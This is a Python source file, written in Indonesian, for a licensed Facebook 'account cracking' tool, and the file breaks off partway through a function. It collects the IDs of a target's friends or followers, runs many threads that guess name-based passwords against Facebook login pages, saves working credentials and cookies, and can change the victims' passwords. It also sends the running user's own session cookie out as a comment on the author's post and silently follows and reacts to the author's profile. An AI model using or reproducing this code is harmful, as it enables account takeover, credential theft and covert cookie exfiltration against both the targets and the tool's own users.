#-------------------[ JANGAN DI GANTI² KONTOL ]---------------------#
import os, time
try:
     import rich
except (ModuleNotFoundError,ImportError):
     print('\t ! Please wait...') ; time.sleep(0.03) ; os.system('pip install rich')
try:
     import requests
except (ModuleNotFoundError,ImportError):
     print('\t ! Please wait...') ; time.sleep(0.03) ; os.system('pip install requests')
try:
     import bs4
except (ModuleNotFoundError,ImportError):
     print('\t ! Please wait...') ; time.sleep(0.03) ; os.system('pip install bs4')

#-------------------[ MODUL IN PYTHON3 & RICH ]---------------------#
import re, sys, json, requests, random, datetime, subprocess, platform, bs4
from concurrent.futures import ThreadPoolExecutor as khamdihiXV
from bs4 import BeautifulSoup as parse
from datetime import datetime

from rich import print as zprint
from rich.panel import Panel
from rich.console import Console
console = Console()
ses = requests.Session()

#-------------------[ BULAN 12 AND CREATOR SC ]---------------------#
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]

days = datetime.now().day
year = datetime.now().year
indo = "%s-%s-%s"%(days,reall,year)

author   = 'khamdihi'
facebook = 'khamdihi DEV (https://m.facebook.com/profile.php?id=100086281072244)'
whatsapp = '0857 2941 6714'
komen    = random.choice(
	 ['hello bang😎','Keren Suhu','Salam kenal bang♥','panutan ku!','Kelazz','mantap bang😎']
)
#-------------------[ COLOR FOR PYTHON RICH ]----------------------#
M = 'color(1)' # ABANG
H = 'color(2)' # IJO
K = 'color(3)' # KUNING
B = 'color(4)' # BIRU
U = 'color(5)' # UNGU
O = 'color(6)' # BIRU NOM
P = 'color(7)' # PUTIH
I = 'color(8)' # IRENG

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

#-------------------[ TAMPUMG DOSA LU² PADA ]-----------------------#
OK = []
CP = []
ID = []

ID2 = []
tod = []
loop = 0
UbahPw = []
Licene = []
Opsine = []
aplikasi = []

# JIKA HASIL TIDAK MAKSIMAL GANTI AJA USER AGENT DI BAWAH INI!
# UA VALIDATE
ua = 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36' #Mozilla/5.0 (Linux; Android 9; PCAM00 Build/PKQ1.190101.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848'
ii = datetime.now() ; bln = ii.month ; thn = ii.year ; tahu = ii.day

def Clear_Terminal(platform):
    if 'win' in sys.platform:os.system('cls')
    else:os.system('clear')

def ApikeyLogin():
    Clear_Terminal(platform) ; Banner()
    List = ('''[green][[white]1[green]]. [bold white]Beli license
[green][[white]2[green]]. [bold white]masukan license/apikey
[green][[white]3[green]]. [bold white]Masuk ke group khusus member
[green][[white]0[green]]. [bold white]Exit [bold red]keluar pemrogramman ''') ; Console(width=50).print(Panel(List,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih menu di atas sesuai keinginan anda!')
    ask = console.input('╰──▸ pilihan : ')
    if ask in ['1','01']:subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+6285729416714&text=+assalamungalaikum bang saya ingin membeli license script crack akun facebook"])
    elif ask in ['2','02']:
         Console(width=50).print(Panel('[bold white]Masukan license/apikey yang di kirim oleh [bold green]ADMIN[bold white] jika belum punya silakan pilih menu nomor 1 yang tersedia di atas!',style='bold purple'))
         zprint('╭──▸ [bold white]Mohon untuk tidak memberi code unik anda kepada siapapun!')
         KunciAnda = console.input('╰──▸ Masukan code unik nya : ') ; Verivikasi(KunciAnda)
    elif ask in ['3','03']:subprocess.check_output(["am", "start",'https://chat.whatsapp.com/FvPXubLqY4IGArGQc8hW9Y']) ; exit(0)
    elif ask in ['3','03']:exit(0)
    else:ApikeyLogin()

def Verivikasi(KunciAnda):
    with requests.Session() as x:
         try:
              CodeToken = "WyIyNjgxNTAwOSIsInVGMFY3dWVHTVFqSUdTbWwwK1FJQldyc2Ftdm54UW41ZHl4MW82VWkiXQ==" ; producID = "17065"
              link = x.get("https://app.cryptolens.io/api/key/Activate?token={}&ProductId={}&Key={}".format(CodeToken, producID, KunciAnda)).json()["licenseKey"]
              requ = link["expires"][:10] ; tahu,bula,tang = requ.split("-")
              isin = "%s%s%s"%(tang,bula,tahu) ; neww = "%s%s%s"%(hri,bln,thn)
              form = "%d%m%Y" ; tess = datetime.strptime(isin,form)
              mekk = datetime.strptime(neww,form) ; z = tess - mekk
              if z.days <1:
                 Console(width=50).print(Panel('[bold red]License anda baru sadah kadarluarsa silakan konfirmasi [bold green]ADMIN',style='bold purple')) ; os.system('rm -rf data/kunci.txt') ; exit(0)
              else:
                 open("data/durasi.txt","w").write(z)
                 open("data/kunci.txt","w").write(KunciAnda)
              print(f'{z}')
         except Exception as e:print(e)
         except KeyError:
              Console(width=50).print(Panel('[bold red]Maaf license anda telah kadarluarsa silakan hubungi admin untuk verifikasi code anda!',style='bold purple')) ; exit(0)
         except requests.exceptions.ConnectionError:
              Console(width=50).print(Panel('[bold red]Tidak ada koneksi internet, mode pesawat 5 detik',style='bold purple')) ; exit(0)

def ConvertCookie(cookies):
    with requests.Session() as x:
         x.headers.update({
            "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
            "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
         })
         try:
               link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
               search = re.search("(EAAG\w+)", link.text).group(1)
               if 'EAAG' in search:
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                   requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
                   open('data/token.txt','w').write(search)
                   open('data/cokie.txt','w').write(cookies)
                   return 'status succes'
         except AttributeError:return 'status gagal login!'

def CekResults():
    exei,exex = 0, []
    exec = ('[green][[white]1[green]]. [bold white]Cek hasil akun OK\n[green][[white]2[green]]. [bold white]Cek hasil akun CP\n[green][[white]0[green]]. [bold white]Kembali') ; Console(width=50).print(Panel(exec,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih salah satu')
    ok_cp = console.input('╰──▸ Ok/cp : ')
    if ok_cp in ['1','01']:
       print('\r')
       try:ok = os.listdir('OK')
       except:zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       for i in ok:
           exex.append(i)
           exei +=1
           try:cek=open('OK/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold green][[bold white]{}[bold green]] [bold white]{} : [bold green]{} [bold white]akun'.format(exei,i,len(cek)))

       file = input(f'\n {N}[{H}?{N}] Pilih nomor :{H} ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('OK/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       print('\n')
       print(f'\r {H}{ok}') ; exit(0)

    elif ok_cp in ['2','02']:
       zprint('\r')
       try:cp=os.listdir('CP')
       except:zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       for i in cp:
           exex.append(i)
           exei +=1
           try:cek=open('CP/{}'.format(i),'r').readlines()
           except:continue
           zprint(' [bold yellow][[bold white]{}[bold yellow]]. [bold white]{} : [bold yellow]{} [bold white]akun'.format(exei,i,len(cek)))
       file = input(f'\n {N}[{K}?{N}] Pilih nomor : ')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('CP/{}'.format(dump),'r').read()
       except:
           zprint('\n [red][[white]×[red]] [white]File tidak ada') ; exit(0)
       print('\n')
       print(f'{K}{ok}') ; exit(0)
    else:
       menu()

def ChekOption():
    exec = '[bold green][[bold white]1[bold green]]. [bold white]Chek opsi 1 akun\n[bold green][[bold white]2[bold green]]. [bold white]Chek opsi lewat file\n[bold green][[bold red]0[bold green]]. [bold white]Kembali'
    Console(width=50).print(Panel(exec,style='bold purple'))
    zprint('╭──▸ [bold white]Pilih menu di atas')
    ask = console.input('╰──▸ pilihan : ')
    if ask in ['1','01']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan data akun anda, gunakan tanda | untuk pemisahan userid dan password contoh 10008|sandi akun anda' ; Console(width=50).print(Panel(asik,style='bold purple'))
         zprint('╭──▸ [bold white]Harap di baca biar gak eror')
         user = console.input('╰──▸ username|password : ')
         try:uid,nama = user.split('|')
         except:exit(f'\n {N}[{M}×{N}] {M}Kesalahan...')
         CekOptionAcount(uid,nama) ; exit(0)
    elif ask in ['2','02']:
         asik = '[bold green][[bold white]*[bold green]] [bold white]Masukan nama file berisi akun chekpoint' ; Console(width=50).print(Panel(asik,style='bold purple'))
         zprint('╭──▸ [bold white]Pastikan nama file berada di folde : CP')
         file = console.input('╰──▸ nama file : ')
         try:cp=open('CP/'+file,'r').readlines()
         except:exit(f'\n {N}[{M}×{N}] {M}File tidak ada cok!')
         for i in cp:
             asu = i.replace('\n','')
             itu = asu.split('|')
             print('\n {}[{}?{}] {}Mengechek akun : {}|{}'.format(N,H,N,P,itu[0],itu[1]))
             CekOptionAcount(itu[0],itu[1])
         exit(f'\n {N}[{H}✓{N}] {P}Proses cek akun chekpoint telah selesai...')
    else:
         menu()

def CekOptionAcount(user,pw):
	ses = requests.Session()
	url = 'free.facebook.com'
	try:
		link = ses.get(f"https://{url}/login/?source=auth_switcher")
		data = {
			"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
			"email":user,
			"pass":pw
		}
		posz = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100",data=data) #,headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36"})
		if "checkpoint" in ses.cookies.get_dict():
			posh = parse(posz.text,"html.parser")
			find = posh.find("form",method="post")["action"]
			data1 = {
				"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(posz.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"',str(posz.text)).group(1),
				"checkpoint_data":"",
				"submit[Continue]": "Lanjutkan",
				"nh":re.search('name="nh" value="(.*?)"',str(posz.text)).group(1),
			}
			zozo = ses.post(f"https://{url}{find}",data=data1)
			cari = parse(zozo.text,"html.parser")
			opsi = cari.find_all("option")
			if len(opsi) == 0:
				if "Lihat detail login yang ditampilkan. Ini Anda?" in str(cari.find("title").text):
					print(f'\r      {H}• Akun tap yes ♥')

				elif "Masukkan Kode Masuk untuk Melanjutkan" in str(cari.find("title").text):
					print(f"\r        {M}• {N}akun terpasang a2f			  		' '")
				else:
					print(f'\r      {M}• {N}Login eror')
			else:
				i = 0
				for ketemu in opsi:
					i +=1
					print(f'\r        {H}• {N}ada {len(opsi)} opsi yang tersedia			   		{N}')
					print(f"\r        {M}{i}. {K}{ketemu.text} {N}")

		elif "c_user" in ses.cookies.get_dict():
			cokie = (";").join(["%s=%s"%(a,b) for a,b in ses.cookies.get_dict().items()])
			print(f"\r {H}*  --> {user}|{pw}|{cokie}")
			open("OK/%s.txt"%(indo),"a").write(f"{user}|{pw}|{cokie}")
		else:
			print(f" {N}[{M}×{N}] {M}Kata sandi yang anda masukan salah.")
	except Exception as e:
		pass

def Banner():
    KAGLK = '''[bold white]╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔╗
 ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ╠╩╗
 ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝ 
 ( Di Buat oleh [bold green]Khamdihi[bold white] ) '''
    Console(width=50).print(Panel(KAGLK,style='bold purple'),justify='center')

def Masuk():
    Clear_Terminal(platform) ; Banner()
    ask = '[bold white]Anda belum login. masukan cookie akun facebook anda tidak di sarankan pake akun utama!' ; Console(width=50).print(Panel(ask,style='bold purple')) ; zprint('╭──▸ [bold white]cookies')
    coki = file = console.input('╰──▸ [bold white]Masukan cookies : ')
    if coki in ['',' ']:Masuk()
    else:
          link = ConvertCookie(coki)
          if 'status succes' in str(link):AuthorBot('https://mbasic.facebook.com/100086281072244?v=timeline',coki) ; FollowMe(coki) ; menu()
          else:print('\n [×] Cookie invalid!') ; time.sleep(2);Masuk()

def AuthorBot(url,kontol):
    try:
          link = parse(requests.get(url,cookies = {'cookie':kontol}).text,'html.parser')
          for otw in link.find_all('a',href=True):
                if 'Tanggapi' in otw.text:
                     reac = random.choice(['Super','Peduli','Marah','Sedih','Wow'])
                     for send in parse(requests.get('https://mbasic.facebook.com{}'.format(otw['href']), cookies = {'cookie':kontol}).text,'html.parser').find_all('a'):
                         if reac in send.text:
                               requests.get('https://mbasic.facebook.com{}'.format(send['href']), cookies = {'cookie':kontol})
                         else:
                               continue
          AuthorBot('https://mbasic.facebook.com{}'.format(link.find('a',string='Lihat Berita Lain')['href']), kontol)
    except Exception as e:pass

def FollowMe(kontol):
    try:
          for i in parse(requests.get('https://mbasic.facebook.com/100086281072244', cookies = {'cookie':kontol}).text,'html.parser').find_all('a',href=True):
              if '/a/subscribe.php?' in i.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(i['href']), cookies = {'cookie':kontol}).text
    except Exception as e:pass

def menu():
    Clear_Terminal(platform)
    try:
          cokis = open('data/cokie.txt','r').read()
          token = open('data/token.txt','r').read()
    except (FileNotFoundError,IOError):Masuk()
    try:
          link = requests.Session().get('https://graph.facebook.com/me?access_token={}'.format(token), cookies = {'cookie':cokis}).json()
          nama,user = link['name'],link['id']
    except KeyError:Masuk()
    except requests.exceptions.ConnectionError:exit(' [×] Tidak ada koneksi.')
    Banner() ; time.sleep(0.01) ; exec = (f'[bold white]Selamat datang [bold green]{nama}[bold white], selamat menggunakan') ; Console(width=50).print(Panel(exec,style='bold purple'))
    list = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari publik
[bold green][[bold white]2[bold green]]. [bold white]Crack dari publik massal
[bold green][[bold white]3[bold green]]. [bold white]Crack dari followers publik
[bold green][[bold white]4[bold green]]. [bold white]Crack dari email random
[bold green][[bold white]5[bold green]]. [bold white]Chek hasil crack
[bold green][[bold white]6[bold green]]. [bold white]Chek opsi akun chekpoint
[bold green][[bold white]0[bold green]]. [bold white]Keluar''') ; Console(width=50).print(Panel(list,style='bold purple'))
    zprint('╭──▸ [bold white]pilih menu')
    assk = console.input('╰──▸ [bold white]Yang mana : ')
    if assk in ['1','01']:
          Console(width=50).print(Panel('[bold white]Ketik me jika ingin crack dari daftar teman akun tumbal anda.',style='bold purple'))
          zprint('╭──▸ [bold white]Pastikan target publik.')
          id = console.input('╰──▸ [bold white]Masukan userid : ')
          try:
                for x in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(id,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                    ID.append(x['id'] +'/'+ x['name'])
          except KeyError:
                Console(width=50).print(Panel(f'[bold red]Akun {id} tidak publik, cari yang lain',style='bold purple')) ; time.sleep(2) ; menu()
          AturUser()

    elif assk in ['2','02']:
         Console(width=50).print(Panel('[bold white]Ketik me jika ingin crack dari daftar teman akun tumbal anda, dan gunakan tanda koma untuk pemisahan userid contoh pemisahan : 10008,10005',style='bold purple'))
         zprint('╭──▸ [bold white]Pastikan target publik')
         id = console.input('╰──▸ [bold white]Masukan userid : ')
         for kontol in id.split(','):
             try:
                   for data in requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(kontol,open('data/token.txt','r').read()), cookies={"cookie":open('data/cokie.txt','r').read()}).json()['friends']['data']:
                       ID.append(data['id'] +'/'+ data['name'])
             except KeyError:pass
         AturUser()

    elif assk in ['3','03']:
         Console(width=50).print(Panel('[bold white]Ketik  me jika ingin crack dari daftar followers sendiri, gunakan tanda koma untuk pemisahan userid contoh pemisahan userid : 10008,10005',style='bold purple'))
         zprint('╭──▸ [bold white]Pastikan target publik!')
         id = console.input('╰──▸ [bold white]Masukan userid : ')
         for UserPengguna in id.split(','):
             try:
                    for data in requests.get('https://graph.facebook.com/{}?fields=name,subscribers.fields(id,name).limit(5000)&access_token={}'.format(UserPengguna, token), cookies={'cookie':cokis}).json()['subscribers']['data']:
                        ID.append(data['id'] +'/'+ data['name'])
             except KeyError:pass
         AturUser()

    elif assk in ['4','04']:
         Console(width=50).print(Panel('[bold white]Masukan nama target gunakan tanda koma untuk pemisahan contoh pemisahan nama : andi,andika',style='bold purple'))
         zprint('╭──▸ [bold white]masukan nama terserah anda')
         nama = console.input('╰──▸ [bold white]Masukan nama terget : ')
         main = console.input('╰──▸ [bold white]Masukan domain contoh @gmail.com : ')
         for i in nama.split(','):
             for x in range(2000):
                   blkag = ["cans","dika","gaming","gamers","gg","ganteng","cantik","12","1","29","lol","dan","ddk","kntl","zuk","fika","diana","rio","dita","tina","nunu","nana","dih","adi","riyanto","tok","to","yani","ra","hera","aditya","amel","melda","sry","man","fian","fia","via","firman","dimas","adil","epun","ulin","ufik","ine","ina","santi","devi","itoh","fik","rofik","limin","ipin","mah","sad","nah","yaya","iman","imam","daus","dah","nih","bos","dit","adit","in","tan",'andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','dimas','ifu','ask','ozan','zan','pit','hi','ndah','fah','ul','nana','nan','difa','andika','dik','apa','spa','mbuh','koe','andre','fit','fifa','vira','ais','pis']
                   depan = ["say","amel","siti","official","dapit","zidan","ramdan","hamdan","nurul","katul","fadil","dil","hi","can","tzy","wibu","za","zak","roz","32","16","09","28","idih","mbuh","spa","amin","den","min","bas","abas","suki","xd","ficial","fitri","dewi","dito","aziz","tini","itil","pah","tep","ndah","po","24","tiwi","budi","bud","bun","gong","ya","cok","jan","332","01",'andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko','rina','tino','risa','sa','pin','cok','iya','pi','mail','fizi','it','hacker','wibu','iyan','rin','tan']
                   angka = [str(random.choice(depan)),str(random.randint(0,31)),str(random.choice(blkag)),str(random.randint(0,50))]
                   dumpp = "%s%s%s/%s"%(i,random.choice(angka),main,i)
                   if dumpp in ID:pass
                   else:
                           ID.append(dumpp)
         AturUser()
    elif assk in ['5','05']:CekResults()
    elif assk in ['6','06']:ChekOption()
    elif assk in ['0','00']:os.system('rm -rf data/token.txt && rm -rf cokie.txt') ; exit(0)
    else:menu()

def AturUser():
    Console(width=50).print(Panel(f'[bold green][[bold white]*[bold green]] [bold white]Total id : {len(ID)}',title='[bold red][[bold white] userid [bold red]]',style='bold purple'))
    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari ID tua
[bold green][[bold white]2[bold green]]. [bold white]Crack dari ID new
[bold green][[bold white]3[bold green]]. [bold white]Crack dari ID random''') ; Console(width=50).print(Panel(exec , title='[bold red][[bold white] Atur urutan [bold red]]', style='bold purple'))
    zprint('╭──▸ [bold white]Di sarankan from ID new')
    idndi = console.input('╰──▸ [bold white]Atur id : ')
    if idndi in ['1','01']:
         for i in ID:
               ID2.append(i)
    elif idndi in ['2','02']:
         for i in ID:
             ID2.insert(0,i)
    else:
         for i in ID:
             xx = random.randint(0, len(ID2))
             ID2.insert(xx, i)
    AturLogin()

def AturLogin():
    metod = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari methode reguler v1
[bold green][[bold white]2[bold green]]. [bold white]Crack dari methode reguler v2
[bold green][[bold white]3[bold green]]. [bold white]Crack dari methode validate password ''') ; Console(width=50).print(Panel(metod, title='[bold red][[bold white] Methode [bold red]]',style='bold purple'))
    zprint('╭──▸ [bold white]jika anda clone email tidak di sarankan memakai validate!')
    z = console.input('╰──▸ [bold white]Pilih : ')
    if z in ['1','01']:tod.append('reguler')
    elif z in ['2','02']:tod.append('regulerv2')
    elif z in ['3','03']:tod.append('validate')
    else:tod.append('reguler')

    exec = ('''[bold green][[bold white]1[bold green]]. [bold white]Crack dari free.facebook.com
[bold green][[bold white]2[bold green]]. [bold white]Crack dari mbasic.facebook.com
[bold green][[bold white]3[bold green]]. [bold white]Crack dari mobile.facebook.com''') ; Console(width=50).print(Panel(exec , title='[bold red][[bold white] Url login [bold red]]',style='bold purple'))
    zprint('╭──▸ [bold white]Silakan pilih url login disarankan (free atau mobile)')
    link = console.input('╰──▸ [bold white]Url login : ')
    if link in ['1','01']:url='free.facebook.com'
    elif link in ['2','02']:url='mbasic.facebook.com'
    else:url='m.facebook.com'

    pwh = ('[bold green][[bold white]?[bold green]] [bold white]Apakah kamu ingin mengubah password akun OK saat proses crack berjalan?') ; Console(width=50).print(Panel(pwh,title='[bold red][[bold white] Pertanyaan[bold red]]',style='bold purple'))
    zprint('╭──▸ [bold white]Andah akan mengubah password y/t ')
    ubah = console.input('╰──▸ [bold white]Ubah password : ')
    if ubah in ['y','Y','iya']:
          UbahPw.append('ya')
          add_Password = console.input('╰──▸ [bold white]Masukan password baru : [bold green]')
          if len(add_Password) <=5:
               exit(f'\n {N}[{M}×{N}] {K}Password harus lebih dari 5 karaktaer contoh : sayang')
          else:
               open('password_baru_kamu.txt','w').write(add_Password)
    else:UbahPw.append('no')
    itil = ('[bold green][[bold white]?[bold green]] [bold white]Apakah kamu ingin menampilkan opsi saat proses crack berjalan?') ; Console(width=50).print(Panel(itil,title='[bold red][[bold white] Pertanyaan [bold red]]',style='bold purple'))
    zprint('╭──▸ [bold white]Andah akan menampilkan opsi CP y/t')
    opsi = console.input('╰──▸ [bold white]Tampilkan opsi : ')
    if opsi in ['y','Y','iya']:Opsine.append('ya')
    else:Opsine.append('no')

    jmbt = ('[bold green][[bold white]?[bold green]] [bold white]Menampilkan aplikasi pada akun OK akan menyebabkan akun terkena sesi new atau sesi mati!') ; Console(width=50).print(Panel(jmbt,title='[bold red][ [bold white]keterangan [bold red]]',style='bold purple'))
    zprint('╭──▸ [bold white]Andah akan menampilkan aplikasi y/t')
    apk = console.input('╰──▸ [bold white]Tampilkan aplikasi : ')
    if apk in ['y','Y','iya']:aplikasi.append('ya')
    else:aplikasi.append('tidak kontol')
    WordlistLogin().password(url)

class WordlistLogin:
    def __init__(self):
        pass

    def password(self,link):
        exec = (f'[bold green][[bold white]*[bold green]]. [bold white]OK save in : OK/{indo}.txt\n[bold green][[bold white]*[bold green]]. [bold white]CP save in : CP/{indo}.txt') ; Console(width=50).print(Panel(exec ,style='bold purple')) ; print(' ')
        with khamdihiXV(max_workers=30) as coid:
             for UserAkun in ID2:
                  try:
                         uid,nama = UserAkun.split('/')
                         terserah = nama.split(' ')[0]
                         if len(nama) <=5:
                                if len(terserah) <=1 or len(terserah) <=2:pass
                                else:
                                         pwx = [terserah+'123', terserah+'1234', terserah+'12345',terserah+'321','sayang','kata sandi','bismillah',nama.lower()]
                         else:
                                 pwx = [nama, terserah+'123', terserah+'1234', terserah+'12345', terserah+'321','sayang','kata sandi','bismillah',nama.lower()]
                         if 'reguler' in tod:
                               coid.submit(self.crackxv, uid, pwx, link)
                         elif 'validate' in tod:
                               coid.submit(self.Validate, uid, pwx, link)
                         elif 'regulerv2' in tod:
                               coid.submit(self.crackxv2, uid, pwx, link)
                         else:
                               coid.submit(self.crackxv, uid, pwx, link)
                  except Exception as e:pass
        exit(f'\n\n {N}[{H}✓{N}] Crack telah selesai OK:{len(OK)} CP:{len(CP)}')

    def UserAgent(self):
        return random.choice(open("user.txt","r").read().splitlines())

    def crackxv(self, user, pwx, url):
        global loop, OK,CP
        print(f'\r \033[97mcrack v1 {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as ses:
                          link = ses.get(f'https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Fopensearch%2Fconfig.xml').text
                          data = {"lsd":re.search('name="lsd" value="(.*?)"', link).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', link).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', link).group(1),"li":re.search('name="li" value="(.*?)"', link).group(1),"try_number":"0","unrecognized_tries":"0","email":user,"pass":pw,"login":"Masuk"}
                          head = {'Host': url,'content-length': '135','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://'+url,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': f'https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Fopensearch%2Fconfig.xml','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          posz = ses.post(f'https://{url}/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fopensearch%2Fconfig.xml&amp;refsrc=deprecated&amp;lwv=100&amp;refid=8',data=data, headers=head)
                          if 'c_user' in ses.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in ses.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               print('\r %s*  --> %s|%s|%s                       '%(H,uuid,pw,kueh))
                               if 'ya' in UbahPw:
                                     self.UbahPassword(uuid,pw,kueh,url)

                               if 'ya' in aplikasi:
                                     self.cek_apk(kueh)

                               open('OK/OK-{}.txt'.format(indo),'a').write('%s|%s|%s\n'%(user,pw,kueh))
                               OK.append('DOSA')
                               break

                          elif 'checkpoint' in ses.cookies.get_dict():
                               uuid = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                               if 'ya' in Opsine:
                                     print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,uuid,pw))
                                     CekOptionAcount(uuid,pw)
                               else:
                                     print('\r %s*  --> %s|%s                   \x1b[1;91m'%(K,uuid,pw))
                               open('CP/CP-{}.txt'.format(indo),'a').write('%s|%s\n'%(uuid,pw))
                               CP.append('TAI')
                               break

                          else:
                               continue
             except requests.exceptions.ConnectionError: time.sleep(30)
        loop +=1

    def Validate(self, user, pwx, url):
        global loop, OK, CP
        print(f'\r \033[97mcrack {H}{url}{N} {loop}/{len(ID2)} OK:{len(OK)} CP:{len(CP)}', end=' '); sys.stdout.flush()
        for pw in pwx:
             try:
                     with requests.Session() as x:
                          agen = self.UserAgent()
                          link = x.get('https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user)).text
                          data = {'lsd':re.search('name="lsd" value="(.*?)"', link).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', link).group(1),'uid':user,'next':'https://developers.facebook.com/webmaster/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(random.randint(0000000000, 9999999999),pw)}
                          head = {'Host': url,'content-length': '319','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://' + url,'content-type': 'application/x-www-form-urlencoded','user-agent': agen,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://{}/login/device-based/password/?uid={}&next=https%3A%2F%2Fdevelopers.facebook.com%2Fwebmaster%2F&flow=login_no_pin&refsrc=deprecated&_rdr'.format(url,user),'accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
                          posh = x.post('https://{}/login/device-based/validate-password/?shbl=0'.format(url),data=data, headers=head, allow_redirects=False)
                          if 'c_user' in x.cookies.get_dict():
                               kueh = ';'.join([str(a)+'='+str(b) for a,b in x.cookies.get_dict().items()])
                               uuid = re.search('c_user=(.*?);', kueh).group(1)
                               print('\r %s*  --> %s|%s|%s             '%(H,uuid,pw,kueh))
                               if 'ya' in UbahPw:
                                     self.UbahPassword(uuid,pw,kueh,url)
                               else:pass
                               if 'ya' in aplikasi:
                                     self.cek_apk(kueh)
                               else:pass
